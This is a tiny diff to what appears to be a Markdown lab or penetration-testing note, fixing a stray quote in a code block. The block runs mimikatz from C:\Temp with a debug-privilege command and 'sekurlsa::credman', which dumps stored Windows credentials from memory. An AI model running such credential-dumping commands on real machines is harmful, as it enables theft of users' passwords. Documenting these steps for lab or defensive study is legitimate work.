@@ -136,7 +136,7 @@ cmd> cd C:\Temp
 cmd> .\mimikatz.exe
 
 mimikatz# privilege debug
-mimikatz# sekurlsa::credman'
+mimikatz# sekurlsa::credman
 ```
 ![[Pasted image 20250930172947.png]]
 
